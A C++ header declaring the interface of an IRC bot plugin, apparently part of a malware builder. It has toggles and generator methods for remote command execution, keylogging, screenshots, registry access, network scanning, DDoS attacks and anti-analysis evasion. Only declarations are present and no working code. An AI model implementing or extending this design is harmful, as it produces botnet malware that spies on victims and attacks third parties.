#pragma once
#include <string>
#include <vector>

// Configuration structure for IRC bot
struct IRCBotConfig {
    std::string server;
    int port;
    std::string channel;
    std::string nickname;
    std::string username;
    std::string realname;
    std::string password;
    bool useSSL;
    bool autoReconnect;
    bool floodProtection;
    bool commandExecution;
    bool fileTransfer;
    bool keylogging;
    bool screenshot;
    bool systemInfo;
    bool processList;
    bool registryAccess;
    bool networkScan;
    bool ddosAttack;
    bool encryption;
    bool antiAnalysis;
};

// IRC Bot Plugin Interface
class IRCBot {
private:
    IRCBotConfig config;

    // Utility functions
    std::string generateIRCConnection();
    std::string generateCommandHandler();
    std::string generateFileTransfer();
    std::string generateKeylogger();
    std::string generateScreenshot();
    std::string generateSystemInfo();
    std::string generateProcessList();
    std::string generateRegistryAccess();
    std::string generateNetworkScan();
    std::string generateDDoSAttack();
    std::string generateEncryption();
    std::string generateAntiAnalysis();
    std::string generateFloodProtection();

    // Menu handlers
    void handleIRCConnection();
    void handleCommandHandler();
    void handleFileTransfer();
    void handleKeylogger();
    void handleScreenshot();
    void handleSystemInfo();
    void handleProcessList();
    void handleRegistryAccess();
    void handleNetworkScan();
    void handleDDoSAttack();
    void handleEncryption();
    void handleAntiAnalysis();
    void handleFloodProtection();
    void handleConfiguration();

public:
    IRCBot();
    ~IRCBot();

    // Plugin interface methods
    std::string getName() const;
    std::string getDescription() const;
    std::string getVersion() const;
    bool initialize();
    void execute();
    std::vector<std::string> getOptions() const;
    void setOption(const std::string& option, const std::string& value);

    // IRC Bot Methods
    std::string createIRCConnection(const std::string& server, int port, const std::string& channel);
    std::string createCommandHandler(const std::string& commands);
    std::string createFileTransfer(const std::string& protocol);
    std::string createKeylogger();
    std::string createScreenshot();
    std::string createSystemInfo();
    std::string createProcessList();
    std::string createRegistryAccess(const std::string& keys);
    std::string createNetworkScan(const std::string& targets);
    std::string createDDoSAttack(const std::string& target, int duration);
    std::string addEncryption(const std::string& data, const std::string& key);
    std::string addAntiAnalysis(const std::string& code);
    std::string addFloodProtection(const std::string& code);

    // Configuration methods
    void setServer(const std::string& server);
    void setPort(int port);
    void setChannel(const std::string& channel);
    void setNickname(const std::string& nickname);
    void setUsername(const std::string& username);
    void setRealname(const std::string& realname);
    void setPassword(const std::string& password);
    void setUseSSL(bool use);
    void setAutoReconnect(bool reconnect);
    void setFloodProtection(bool protect);
    void setCommandExecution(bool execute);
    void setFileTransfer(bool transfer);
    void setKeylogging(bool keylog);
    void setScreenshot(bool screenshot);
    void setSystemInfo(bool info);
    void setProcessList(bool process);
    void setRegistryAccess(bool registry);
    void setNetworkScan(bool scan);
    void setDDoSAttack(bool ddos);
    void setEncryption(bool encrypt);
    void setAntiAnalysis(bool anti);

    // Menu interface
    void showMenu();
};
